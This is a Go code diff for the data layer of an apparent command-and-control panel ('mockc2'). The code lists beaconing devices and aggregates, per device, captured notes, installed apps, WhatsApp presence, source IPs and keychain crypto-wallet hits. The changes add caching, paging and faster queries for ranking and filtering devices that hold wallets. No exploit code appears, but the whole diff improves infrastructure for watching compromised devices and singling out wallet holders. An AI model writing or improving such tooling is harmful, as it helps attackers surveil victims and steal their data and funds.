@@ -1,13 +1,12 @@
 package store
 
 import (
-	"encoding/json"
 	"math"
-	"os"
-	"path/filepath"
 	"regexp"
 	"sort"
 	"strings"
+	"sync"
+	"sync/atomic"
 	"time"
 
 	"mockc2/internal/config"
@@ -28,38 +27,114 @@ func capRoot() string { return config.Get().CaptureRoot }
 // 拖慢同库上的投递链写操作（access_log/devices/packets 入库排队）。
 // 新版：设备身份 + beacon 时间一次查询；war/notes/apps/wallets/profile 各一次批量聚合；
 // 全部走 DB（v8/v9 已把实体落库），不再读回传文件。
+// listDevicesCache ListDevices 结果缓存（stale-while-revalidate）。
+//
+// ListDevices 被 /panel/api/devices、/api/list?type=managed、AggStats（overview）
+// 与看板高频调用，每次都要跑 6 组万级聚合 + 万级设备循环。实测（INC-20260930-02，
+// 远程 12 次连续轮询）：TTL 过期后的同步重算会间歇性冲到 20~26s，前端 25s 超时
+// 直接报"无法连接后端服务"。改为 SWR：过期先回旧数据 + 后台异步重算，读路径永不
+// 同步等重算；仅冷启动（无任何旧数据）才同步构建一次。
+// 约定：调用方只读，不得修改返回的 map（内部共享同一份）。
+var listDevicesCache struct {
+	mu         sync.RWMutex
+	data       []map[string]any
+	expire     time.Time
+	refreshing atomic.Bool
+}
+
+// ListDevices 设备台账（SWR 缓存；TTL 10s，过期后台刷新，见 listDevicesCache 注释）。
 func ListDevices() []map[string]any {
+	listDevicesCache.mu.RLock()
+	if time.Now().Before(listDevicesCache.expire) {
+		d := listDevicesCache.data
+		listDevicesCache.mu.RUnlock()
+		return d
+	}
+	stale := listDevicesCache.data
+	listDevicesCache.mu.RUnlock()
+
+	// 过期但有旧数据：立即回旧值，后台异步重算（并发触发只放行一个刷新者）
+	if stale != nil {
+		if listDevicesCache.refreshing.CompareAndSwap(false, true) {
+			go func() {
+				defer listDevicesCache.refreshing.Store(false)
+				d := listDevicesUncached()
+				if len(d) > 0 {
+					listDevicesCache.mu.Lock()
+					listDevicesCache.data = d
+					listDevicesCache.expire = time.Now().Add(10 * time.Second)
+					listDevicesCache.mu.Unlock()
+				}
+			}()
+		}
+		return stale
+	}
+
+	// 冷启动：无任何旧数据，必须同步构建（保留 double-check 防并发重复构建）
+	listDevicesCache.mu.Lock()
+	defer listDevicesCache.mu.Unlock()
+	if listDevicesCache.data != nil && time.Now().Before(listDevicesCache.expire) {
+		return listDevicesCache.data
+	}
+	d := listDevicesUncached()
+	listDevicesCache.data = d
+	listDevicesCache.expire = time.Now().Add(10 * time.Second)
+	return d
+}
+
+// WarmCaches 预热高频聚合缓存（设备列表 + 阶段进度）。
+//
+// 重启后首个请求否则要独自承担全量聚合：ClientStageProgress 对 54 万行 access_log
+// 做 GROUP BY，加上 6 组万级聚合，实测 6s+ —— 观感就是"一部署就卡"。
+// 由启动后台任务在历史回填完成后调用（此时 DB 竞争已结束）。
+func WarmCaches() {
+	_ = ListDevices()
+	_ = ClientStageProgress()
+}
+
+func listDevicesUncached() []map[string]any {
 	db := GetDB()
 	if db == nil {
 		return []map[string]any{}
 	}
+	// 读模型：device_stats（每设备一行，入库时增量维护）——请求路径不再对 packet_meta 现场 GROUP BY。
 	rows := db.Query(`
+        SELECT uuid, first_seen, last_seen, beacon_epoch, notes_count, apps_count
+        FROM device_stats ORDER BY last_seen DESC, uuid ASC`)
+	useStats := len(rows) > 0
+	if !useStats {
+		// 回退：物化表尚未回填时，退回旧现场聚合（行为不变）。
+		rows = db.Query(`
         SELECT m.value AS uuid,
-               MIN(p.recv_ts) AS first_seen,
+               MIN(NULLIF(p.first_recv_ts,'')) AS first_seen,
                MAX(p.recv_ts) AS last_seen,
-               MAX(CASE WHEN p.endpoint='beacon' THEN p.recv_epoch END) AS beacon_epoch
+               MAX(CASE WHEN p.endpoint='beacon' THEN p.recv_epoch END) AS beacon_epoch,
+               0 AS notes_count, 0 AS apps_count
         FROM packet_meta m JOIN packets p ON p.id = m.packet_id
         WHERE m.field IN ('uuid','lhu') AND p.endpoint IN ('beacon','a') AND m.value<>''
         GROUP BY m.value ORDER BY last_seen DESC, m.value ASC`)
+	}
 	if len(rows) == 0 {
 		return []map[string]any{}
 	}
 
-	// 批量聚合（各一次查询）
-	warFiles, warCounts := devicesWarAgg()
-	notes := devicesNotesCountAgg()
-	apps := devicesAppsCountAgg()
+	// 批量聚合（各一次查询；计数在 useStats 时直接取 device_stats）
+	warFiles, _ := devicesWarAgg()
+	notesAgg := map[string]int{}
+	appsAgg := map[string]int{}
+	if !useStats {
+		notesAgg = devicesNotesCountAgg()
+		appsAgg = devicesAppsCountAgg()
+	}
 	wallets := devicesWalletsAgg()
 	profiles := devicesProfileAgg()
+	walletFlags := deviceWalletFlagAgg()
+	watchApps := devicesWhatsAppAgg()
 
-	// 就近 IP 推断（devices 台账一次读取）
-	var timeline []visitPoint
-	for _, v := range db.Query("SELECT last_seen, ip FROM devices ORDER BY last_seen") {
-		ls, ip := toStr(v["last_seen"]), toStr(v["ip"])
-		if tsRe.MatchString(ls) && ip != "" {
-			timeline = append(timeline, visitPoint{ls, ip})
-		}
-	}
+	// 就近 IP 推断：走 last_seen 索引的定点查询（O(log n)）。
+	// 旧实现把 devices 台账整表加载进内存做 O(N) 线性扫、再对每台无档案设备
+	// 各扫一遍 —— 台账随公网访客无界增长后是 O(N²)，是看板重建冲到 20s+ 的主因之一。
+	// （ix_devices_last_seen 索引见 schema.go baselineDDL）
 
 	nowT := nowEpoch()
 	progress := ClientStageProgress()
@@ -68,60 +143,218 @@ func ListDevices() []map[string]any {
 		uuid := toStr(r["uuid"])
 		beaconEpoch := toFloat(r["beacon_epoch"])
 		online := beaconEpoch != 0 && (nowT-beaconEpoch) <= 1800
-		// ip 优先取 device_profiles 权威档案；缺失才回退 nearIP 就近推断
-		ip := toStr(profiles[uuid]["ip"])
-		if ip == "" {
-			ip = nearIPAt(timeline, toStr(r["last_seen"]))
+		hasWallet := toInt(walletFlags[uuid]) > 0 || len(wallets[uuid]) > 0
+		noteCount := int(toInt(r["notes_count"]))
+		appCount := int(toInt(r["apps_count"]))
+		if !useStats {
+			noteCount = notesAgg[uuid]
+			appCount = appsAgg[uuid]
 		}
-		pct := progress[ip]
 		d := map[string]any{
 			"uuid":        uuid,
-			"ip":          ip,
 			"first_seen":  r["first_seen"],
 			"last_seen":   r["last_seen"],
 			"online":      online,
-			"war_count":   warCounts[uuid],
+			"war_count":   len(warFiles[uuid]),
 			"war_files":   warFiles[uuid],
 			"wallets":     wallets[uuid],
-			"notes_count": notes[uuid],
-			"apps_count":  apps[uuid],
-			"progress":    pct,
-			"stage":       StageNameForPercent(pct),
+			"has_wallet":  hasWallet,
+			"wallet_hits": toInt(walletFlags[uuid]),
+			"notes_count": noteCount,
+			"apps_count":  appCount,
+			"ws":          watchApps[uuid],
 		}
+		// 档案字段（machine/deviceName/ios/build/status/src_ip）先拷贝，
+		// IP 链必须在拷贝【之后】计算 —— 否则档案里设备自报的空 ip 会把
+		// 已填充的 src_ip/推断值反向覆盖掉（INC-20260930-02 附带缺陷）。
 		for k, v := range profiles[uuid] {
 			d[k] = v
 		}
+		// IP 展示链：device_profiles 自报（设备权威）→ src_ip 服务器实测 → nearestIPAt 时间近邻推断
+		ip := toStr(profiles[uuid]["ip"])
+		if ip == "" {
+			ip = toStr(profiles[uuid]["src_ip"])
+		}
+		if ip == "" {
+			ip = nearestIPAt(toStr(r["last_seen"]))
+		}
+		d["ip"] = ip
+		pct := progress[ip]
+		d["progress"] = pct
+		d["stage"] = StageNameForPercent(pct)
 		out = append(out, d)
 	}
 	return out
 }
 
-// visitPoint 台账时间线点（last_seen, ip）。
-type visitPoint struct{ ts, ip string }
+// ListDevicesPaged 设备台账分页视图（服务端分页 + 关键词/钱包筛选）。
+//
+// 背景：/panel/api/devices 原先一次性回传全部设备，设备数增长后 JSON 传输 +
+// el-table 全量渲染都会拖慢页面（前端"全加载"卡顿的根源）。
+// 数据源沿用 ListDevices 的 3s TTL 缓存（全量聚合成本由缓存承担，本函数只做
+// 内存筛选与切片），每页只回传 per 台（默认 20），渲染与传输量恒定。
+//
+// 语义对齐旧前端：
+//   - kw 命中字段：uuid / ip / deviceName / machine / ios / build（大小写不敏感）
+//   - wallet：all | wallet（仅有钱包）| none（仅无钱包），以 wallets 列表为准
+//   - 稳定排序：first_seen 倒序 + uuid 兜底（不用 last_seen，避免轮询行序乱跳）
+//
+// 约定：调用方只读，不得修改返回的 map（与 ListDevices 共享同一份底层数据）。
+func ListDevicesPaged(page, per int, kw, wallet string) map[string]any {
+	rows, total, walletTotal := pageDevices(ListDevices(), page, per, kw, wallet)
+	return map[string]any{
+		"devices":      rows,
+		"total":        total,
+		"page":         clampPage(page),
+		"per":          clampPer(per),
+		"wallet_count": walletTotal,
+	}
+}
 
-// nearIPAt 在台账时间线上找与目标时间最近（±30min 内）的 IP；无则取最新一条的 IP。
-func nearIPAt(timeline []visitPoint, target string) string {
-	if len(timeline) == 0 {
-		return ""
+// pageDevices 纯函数：筛选 + 稳定排序 + 分页切片（无 DB/缓存依赖，便于单测）。
+// 返回 当前页行、筛选后总数、全量钱包设备数。
+func pageDevices(all []map[string]any, page, per int, kw, wallet string) ([]map[string]any, int, int) {
+	page, per = clampPage(page), clampPer(per)
+
+	// 钱包设备总数（全量口径，与当前筛选无关；头部 chip 用）
+	walletTotal := 0
+	for _, d := range all {
+		if len(deviceWalletsOf(d)) > 0 {
+			walletTotal++
+		}
 	}
-	t, err := time.ParseInLocation(tsFmt, target, time.Local)
+
+	k := strings.ToLower(strings.TrimSpace(kw))
+	rows := make([]map[string]any, 0, len(all))
+	for _, d := range all {
+		n := len(deviceWalletsOf(d))
+		switch wallet {
+		case "wallet":
+			if n == 0 {
+				continue
+			}
+		case "none":
+			if n > 0 {
+				continue
+			}
+		}
+		if k != "" {
+			hit := false
+			for _, f := range []any{d["uuid"], d["ip"], d["deviceName"], d["machine"], d["ios"], d["build"]} {
+				if strings.Contains(strings.ToLower(toStr(f)), k) {
+					hit = true
+					break
+				}
+			}
+			if !hit {
+				continue
+			}
+		}
+		rows = append(rows, d)
+	}
+
+	// 稳定排序：first_seen 倒序（新设备在上）+ uuid 兜底。
+	// 刻意不用 last_seen —— 设备每次 beacon 都会改变它，导致列表行随轮询乱跳、点不准。
+	sort.SliceStable(rows, func(i, j int) bool {
+		fa, fb := toStr(rows[i]["first_seen"]), toStr(rows[j]["first_seen"])
+		if fa != fb {
+			return fb < fa
+		}
+		return toStr(rows[i]["uuid"]) < toStr(rows[j]["uuid"])
+	})
+
+	total := len(rows)
+	start, end := pageBounds(page, per, total)
+	pageRows := rows[start:end]
+	if pageRows == nil {
+		pageRows = []map[string]any{}
+	}
+	return pageRows, total, walletTotal
+}
+
+func clampPage(page int) int {
+	if page < 1 {
+		return 1
+	}
+	return page
+}
+
+func clampPer(per int) int {
+	if per < 1 {
+		return 20
+	}
+	if per > 1000 {
+		return 1000
+	}
+	return per
+}
+
+// deviceWalletsOf 取设备行的钱包列表（nil-safe）。
+func deviceWalletsOf(d map[string]any) []map[string]any {
+	if ws, ok := d["wallets"].([]map[string]any); ok {
+		return ws
+	}
+	return nil
+}
+
+// pageBounds 计算分页切片边界 [start,end)；越界收敛，不 panic。
+func pageBounds(page, per, total int) (int, int) {
+	start := (page - 1) * per
+	if start < 0 {
+		start = 0
+	}
+	if start > total {
+		start = total
+	}
+	end := start + per
+	if end > total {
+		end = total
+	}
+	return start, end
+}
+
+// nearestIPAt 在 devices 台账里找与 target 最接近（±30min）的来访 IP；
+// 窗口外回退台账最新一条。全部走 ix_devices_last_seen 索引定点查询，
+// 不再整表加载（旧 O(N²) 实现见 git 历史）。
+func nearestIPAt(target string) string {
+	db := GetDB()
+	if tsRe.MatchString(target) {
+		before := db.QueryOne(
+			"SELECT ip, last_seen FROM devices WHERE ip<>'' AND last_seen <= ?"+
+				" ORDER BY last_seen DESC LIMIT 1", target)
+		after := db.QueryOne(
+			"SELECT ip, last_seen FROM devices WHERE ip<>'' AND last_seen > ?"+
+				" ORDER BY last_seen ASC LIMIT 1", target)
+		best, bestd := "", math.MaxFloat64
+		for _, r := range []map[string]any{before, after} {
+			if r == nil {
+				continue
+			}
+			lt, err := time.ParseInLocation(tsFmt, toStr(r["last_seen"]), time.Local)
+			if err != nil {
+				continue
+			}
+			if d := math.Abs(lt.Sub(mustParse(target)).Seconds()); d < bestd {
+				best, bestd = toStr(r["ip"]), d
+			}
+		}
+		if best != "" && bestd <= 1800 {
+			return best
+		}
+	}
+	if latest := db.QueryOne(
+		"SELECT ip FROM devices WHERE ip<>'' ORDER BY last_seen DESC LIMIT 1"); latest != nil {
+		return toStr(latest["ip"])
+	}
+	return ""
+}
+
+func mustParse(ts string) time.Time {
+	t, err := time.ParseInLocation(tsFmt, ts, time.Local)
 	if err != nil {
-		return timeline[len(timeline)-1].ip
+		return time.Time{}
 	}
-	best, bestd := timeline[len(timeline)-1].ip, math.MaxFloat64
-	for _, e := range timeline {
-		lt, err := time.ParseInLocation(tsFmt, e.ts, time.Local)
-		if err != nil {
-			continue
-		}
-		if d := math.Abs(lt.Sub(t).Seconds()); d < bestd {
-			best, bestd = e.ip, d
-		}
-	}
-	if bestd <= 1800 {
-		return best
-	}
-	return timeline[len(timeline)-1].ip
+	return t
 }
 
 // devicesWarAgg 批量聚合 war 包文件与计数（按 lhu/uuid 关联；实体已落库，不读文件头验证）。
@@ -180,13 +413,15 @@ func devicesAppsCountAgg() map[string]int {
 	return out
 }
 
-// devicesWalletsAgg 批量聚合钱包命中：仅来自 war 端点落库的 wallet_seen 快照
-// （war 只做钱包包名解析，keychain.wallets 桶快照），不再读 u 文件 / apps 表补推断。
+// devicesWalletsAgg 批量聚合钱包命中：wallet_seen 快照。来源两条：
+// ① war 包 keychain.wallets 桶（ProcessWar）；② apps.bundle_id × wallet_rules 配对反推
+// （MatchWalletsFromApps —— war 桶为空时钱包字段的唯一可靠来源）。
+// 并把命中规则回配到该设备实际安装的包名（bundle_ids），供前端"钱包 ↔ 包名"对照展示。
 func devicesWalletsAgg() map[string][]map[string]any {
 	db := GetDB()
 	agg := map[string]map[string]any{}
 	for _, r := range db.Query(
-		"SELECT device_uuid, rule_name, MAX(count) AS cnt FROM wallet_seen"+
+		"SELECT device_uuid, rule_name, MAX(count) AS cnt FROM wallet_seen" +
 			" WHERE device_uuid<>'' GROUP BY device_uuid, rule_name") {
 		uuid := toStr(r["device_uuid"])
 		rn := toStr(r["rule_name"])
@@ -198,17 +433,88 @@ func devicesWalletsAgg() map[string][]map[string]any {
 		}
 		agg[uuid][rn] = map[string]any{"rule": rn, "display": Display(rn), "count": toInt(r["cnt"])}
 	}
+	// 只对"有钱包命中"的设备取包名配对（避免全表 apps 扫描）
+	uuids := make([]string, 0, len(agg))
+	for u := range agg {
+		uuids = append(uuids, u)
+	}
+	bundles := walletBundlesByDevice(uuids)
 	// 转 []map 并按 count 降序
 	out := map[string][]map[string]any{}
 	for uuid, m := range agg {
 		list := make([]map[string]any, 0, len(m))
 		for _, v := range m {
 			if wm, ok := v.(map[string]any); ok {
+				if bs := bundles[uuid][toStr(wm["rule"])]; len(bs) > 0 {
+					wm["bundle_ids"] = bs
+				}
 				list = append(list, wm)
 			}
 		}
 		sort.Slice(list, func(i, j int) bool { return toInt(list[i]["count"]) > toInt(list[j]["count"]) })
 		out[uuid] = list
+	}
+	return out
+}
+
+// walletBundlesByDevice 对指定设备集合，把命中的钱包规则回配到实际安装的包名。
+// 返回 uuid → rule_name → []bundle_id（升序）。只查给定 uuid，不做全表扫描。
+func walletBundlesByDevice(uuids []string) map[string]map[string][]string {
+	out := map[string]map[string][]string{}
+	if len(uuids) == 0 {
+		return out
+	}
+	ph := strings.TrimSuffix(strings.Repeat("?,", len(uuids)), ",")
+	args := make([]any, 0, len(uuids))
+	for _, u := range uuids {
+		args = append(args, u)
+	}
+	for _, r := range GetDB().Query(
+		"SELECT DISTINCT uuid, bundle_id FROM apps WHERE uuid IN ("+ph+")", args...) {
+		u := toStr(r["uuid"])
+		b := toStr(r["bundle_id"])
+		if u == "" || b == "" {
+			continue
+		}
+		rule := matchWalletRule(b)
+		if rule == "" {
+			continue
+		}
+		if out[u] == nil {
+			out[u] = map[string][]string{}
+		}
+		out[u][rule] = append(out[u][rule], b)
+	}
+	for u := range out {
+		for rule := range out[u] {
+			sort.Strings(out[u][rule])
+		}
+	}
+	return out
+}
+
+// deviceWalletFlagAgg 设备钱包命中映射（device_wallet_flags 一次查询 → uuid→hits）。
+// 设备列表"是否有钱包（有/无）"以该表为准（无行 = 无）；迁移 v3 已从历史数据回填。
+func deviceWalletFlagAgg() map[string]int {
+	db := GetDB()
+	out := map[string]int{}
+	for _, r := range db.Query("SELECT uuid, wallet_hits FROM device_wallet_flags") {
+		out[toStr(r["uuid"])] = int(toInt(r["wallet_hits"]))
+	}
+	return out
+}
+
+// devicesWhatsAppAgg WS 判定：设备是否装有 WhatsApp（按应用资产包名映射）。
+// WhatsApp 官方包名：iOS `net.whatsapp.WhatsApp`、Android `com.whatsapp`（含
+// Business `com.whatsapp.w4b`），统一按 LOWER(bundle_id) LIKE '%whatsapp%' 命中。
+func devicesWhatsAppAgg() map[string]bool {
+	out := map[string]bool{}
+	for _, r := range GetDB().Query(
+		"SELECT DISTINCT uuid FROM apps WHERE LOWER(bundle_id) LIKE '%whatsapp%'") {
+		u := toStr(r["uuid"])
+		if u != "" {
+			out[u] = true
+		}
 	}
 	return out
 }
@@ -244,6 +550,23 @@ func devicesProfileAgg() map[string]map[string]any {
 			out[uuid] = map[string]any{}
 		}
 		out[uuid]["status"] = toStr(r["status"])
+	}
+	// ③ src_ip：服务器侧观测的连接来源 IP（ingest 时由 clientIP 记录）。
+	// 设备 /a 自报 ip 缺失率 ~10%，src_ip 是权威补位（每台取最新一包的来源）。
+	for _, r := range db.Query(`
+        SELECT uuid, src_ip FROM (
+            SELECT m.value AS uuid, m2.value AS src_ip,
+                   ROW_NUMBER() OVER (PARTITION BY m.value ORDER BY p.recv_epoch DESC) AS rn
+            FROM packet_meta m
+            JOIN packets p ON p.id = m.packet_id AND p.endpoint IN ('beacon','a')
+            JOIN packet_meta m2 ON m2.packet_id = p.id AND m2.field='src_ip'
+            WHERE m.field IN ('uuid','lhu') AND m.value<>''
+        ) t WHERE rn = 1`) {
+		uuid := toStr(r["uuid"])
+		if out[uuid] == nil {
+			out[uuid] = map[string]any{}
+		}
+		out[uuid]["src_ip"] = toStr(r["src_ip"])
 	}
 	return out
 }
@@ -307,7 +630,8 @@ func warIndex(lhu string) ([]map[string]any, int) {
 	return files, len(files)
 }
 
-// walletsMeta 单设备钱包命中（仅 war 端点 wallet_seen 快照；war 只做钱包包名解析，不再读 u 文件补推断）。
+// walletsMeta 单设备钱包命中（wallet_seen 快照：war 桶 + apps 包名配对反推），
+// 并把命中规则回配到该设备实际安装的包名（bundle_ids）。
 func walletsMeta(lhu string) []map[string]any {
 	db := GetDB()
 	out := map[string]map[string]any{}
@@ -317,8 +641,12 @@ func walletsMeta(lhu string) []map[string]any {
 		rn := toStr(r["rule_name"])
 		out[rn] = map[string]any{"rule": rn, "display": Display(rn), "count": toInt(r["cnt"])}
 	}
+	bundles := walletBundlesByDevice([]string{lhu})[lhu]
 	list := make([]map[string]any, 0, len(out))
 	for _, v := range out {
+		if bs := bundles[toStr(v["rule"])]; len(bs) > 0 {
+			v["bundle_ids"] = bs
+		}
 		list = append(list, v)
 	}
 	sort.Slice(list, func(i, j int) bool { return toInt(list[i]["count"]) > toInt(list[j]["count"]) })
@@ -366,42 +694,26 @@ func DeviceAssets(lhu string) map[string]any {
 }
 
 // ── 备忘录：只显示解析结果 ──
+// 直读 memos 表（parseMemos 落库的结构化行）。旧实现查 packets 拿文件路径后
+// 逐个 os.ReadFile 读最多 200 个 capture 文件再现场 JSON 解析 —— 库里有现成
+// 结构化数据还去读盘，是看板/列表高轮询下的典型双读坏味道。
 func NoteRows(kw string, page, per int) map[string]any {
 	db := GetDB()
-	cap := capRoot()
-	pids := db.Query(`
-        SELECT p.id, p.recv_ts, p.file_path FROM packets p
-        WHERE p.endpoint='nb' ORDER BY p.recv_epoch DESC LIMIT 200`)
-	rows := []map[string]any{}
-	for _, r := range pids {
-		b, err := os.ReadFile(filepath.Join(cap, filepath.FromSlash(toStr(r["file_path"]))))
-		if err != nil {
-			continue
-		}
-		var o map[string]any
-		if json.Unmarshal(b, &o) != nil {
-			continue
-		}
-		lhu := toStr(o["lhu"])
-		for _, nv := range asAnySlice(o["list"]) {
-			n, _ := nv.(map[string]any)
-			title := toStr(n["title"])
-			if title == "" {
-				title = "(空标题)"
-			}
-			row := map[string]any{"id": n["id"], "title": title,
-				"snippet": toStr(n["snippet"]), "mod": fmtMod(n["mod"]),
-				"ts": r["recv_ts"], "lhu": lhu, "packet_id": r["id"]}
-			if kw != "" {
-				k := strings.ToLower(kw)
-				if !strings.Contains(strings.ToLower(toStr(row["title"])), k) &&
-					!strings.Contains(strings.ToLower(toStr(row["snippet"])), k) &&
-					!strings.Contains(strings.ToLower(lhu), k) {
-					continue
-				}
-			}
-			rows = append(rows, row)
-		}
+	sql := "SELECT m.note_id, m.title, m.snippet, m.mod_ts, m.uuid, m.last_seen AS ts FROM memos m"
+	args := []any{}
+	if kw != "" {
+		k := strings.ToLower(kw)
+		sql += " WHERE LOWER(m.title) LIKE ? OR LOWER(m.snippet) LIKE ? OR LOWER(m.uuid) LIKE ?"
+		args = append(args, "%"+k+"%", "%"+k+"%", "%"+k+"%")
+	}
+	sql += " ORDER BY m.last_seen DESC, m.note_id DESC LIMIT 500"
+	queried := db.Query(sql, args...)
+	rows := make([]map[string]any, 0, len(queried))
+	for _, r := range queried {
+		rows = append(rows, map[string]any{
+			"id": r["note_id"], "title": toStr(r["title"]), "snippet": toStr(r["snippet"]),
+			"mod": toStr(r["mod_ts"]), "ts": toStr(r["ts"]), "lhu": toStr(r["uuid"]),
+		})
 	}
 	total := len(rows)
 	start := (page - 1) * per
@@ -436,14 +748,10 @@ func AggStats() map[string]any {
 	visitsToday := int(toInt(db.QueryOne(
 		"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices"+
 			" WHERE SUBSTR(first_seen,1,10)=?", today)["n"]))
-	onlineRow := db.QueryOne(
-		"SELECT COUNT(*) AS n FROM packet_meta m JOIN packets p ON p.id=m.packet_id" +
-			" WHERE m.field='uuid' AND p.endpoint='beacon'" +
-			"   AND p.recv_epoch >= UNIX_TIMESTAMP()-1800")
-	online := 0
-	if onlineRow != nil {
-		online = int(toInt(onlineRow["n"]))
-	}
+	// 在线数不再单独写一条 SQL —— 直接数 ListDevices 里 online=true 的设备，
+	// 保证"总览的在线"与"设备列表的在线点"永远同口径。
+	// （旧实现用 field='uuid' 单独统计，与列表的 field IN ('uuid','lhu') 不一致，
+	//   实测差 1 台：beacon 把 uuid 写在 lhu 字段的设备被漏掉。）
 	devs := ListDevices()
 	newDevices := int64(0)
 	for _, d := range devs {
@@ -458,14 +766,14 @@ func AggStats() map[string]any {
 	appsRow := db.QueryOne("SELECT COUNT(*) n FROM packets WHERE endpoint='u'")
 
 	st := map[string]any{
-		"visits":        visits,
-		"visits_today":  visitsToday,
-		"new_devices":   newDevices,
-		"devices":       len(devs),
-		"online":        online,
-		"notes":         toInt(notesRow["n"]),
-		"war":           toInt(warRow["n"]),
-		"apps_pkg":      toInt(appsRow["n"]),
+		"visits":       visits,
+		"visits_today": visitsToday,
+		"new_devices":  newDevices,
+		"devices":      len(devs),
+		"online":       0, // 稍后用 onlineDevices 长度回填（与设备列表同口径）
+		"notes":        toInt(notesRow["n"]),
+		"war":          toInt(warRow["n"]),
+		"apps_pkg":     toInt(appsRow["n"]),
 	}
 	counts := map[string]any{}
 	for _, r := range db.Query("SELECT endpoint, COUNT(*) AS n FROM packets GROUP BY endpoint") {
@@ -484,6 +792,7 @@ func AggStats() map[string]any {
 		}
 	}
 	st["counts"] = counts
+	st["online"] = len(onlineDevices)
 	st["online_devices"] = onlineDevices
 	st["online_journal"] = onlineJournal
 	return st
